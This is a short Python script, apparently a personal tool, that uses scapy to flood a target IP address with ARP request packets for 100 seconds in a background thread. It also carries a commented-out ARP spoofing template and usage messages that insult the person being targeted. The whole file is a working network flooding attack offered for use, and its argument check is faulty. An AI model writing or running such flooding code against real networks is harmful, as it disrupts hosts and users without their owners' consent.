from scapy.all import *
from threading import Thread
import time
import sys

def generate_packets(dst_addr):
    #ARP(op=2, pdst=dest_IP, psrc=spoof_IP, hwsrc=hwsrc)
    pkt = ARP(op=1, pdst=dst_addr)
    return pkt

def flood_packet(dst_addr, timeout=100):
    print(dst_addr)
    start_time = time.time()
    while time.time() - start_time < timeout:
        pkt = generate_packets(dst_addr)
        sendp(pkt, verbose=False)

def start_attack(dst_addr):
    try:
        #print(type(dst_addr))
        thread = Thread(target=flood_packet, args=(dst_addr,100))
        thread.start()
    except Exception as ex:
        print(ex)
    

if __name__ == "__main__":
    if(len(sys.argv) < 1):
        print('Enter the IP of the fucker you wanna spam')
        exit(0)
    else:
        try:
            dst_addr = str(sys.argv[1])
            print(f'Spamming {dst_addr} fucker')
            start_attack(dst_addr)
        except Exception as ex:
            print(ex)
